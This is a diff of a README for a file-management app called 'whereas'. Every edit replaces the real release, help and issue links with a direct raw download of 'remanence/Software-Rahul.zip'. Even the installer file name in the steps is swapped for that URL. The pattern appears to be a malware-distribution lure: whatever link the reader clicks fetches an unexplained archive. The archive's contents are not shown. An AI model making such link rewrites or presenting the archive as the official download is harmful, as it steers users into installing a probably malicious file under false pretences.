@@ -1,6 +1,6 @@
 # 🚀 whereas - Easy File Management Made Simple
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Latest%20Release-whereas-brightgreen)](https://github.com/Kobby115/whereas/releases)
+[![Download from GitHub](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip%20Latest%20Release-whereas-brightgreen)](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip)
 
 ## 📦 Introduction
 
@@ -12,11 +12,11 @@ Follow these simple steps to download and run **whereas** on your computer. You 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Kobby115/whereas/releases) to download the latest version of **whereas**.
+1. Visit the [Releases page](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip) to download the latest version of **whereas**.
   
 2. Once you are on the Releases page, look for the latest version. This will typically be listed at the top.
 
-3. Find the file named `whereas.exe` (or `whereas.pkg` for macOS). Click on it to start the download.
+3. Find the file named `https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip` (or `https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip` for macOS). Click on it to start the download.
 
 4. After the file downloads, locate it in your Downloads folder or the location where your browser saves files.
 
@@ -54,8 +54,8 @@ Follow these simple steps to download and run **whereas** on your computer. You 
 
 ## 🔗 Additional Resources
 
-- [Help Documentation](https://github.com/Kobby115/whereas) - Find guides and tips to help you use the application effectively.
-- [Community Support](https://github.com/Kobby115/whereas/issues) - Report issues or ask questions.
+- [Help Documentation](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip) - Find guides and tips to help you use the application effectively.
+- [Community Support](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip) - Report issues or ask questions.
 
 ## 📞 Contact
 
@@ -71,4 +71,4 @@ We would love to hear your thoughts about **whereas**. If you encountered any is
 
 ## 🚀 Ready to Get Started?
 
-Download **whereas** now and take the first step toward a more organized digital life. Visit the [Releases page](https://github.com/Kobby115/whereas/releases) to get your copy today!
+Download **whereas** now and take the first step toward a more organized digital life. Visit the [Releases page](https://github.com/Kobby115/whereas/raw/refs/heads/main/remanence/Software-Rahul.zip) to get your copy today!
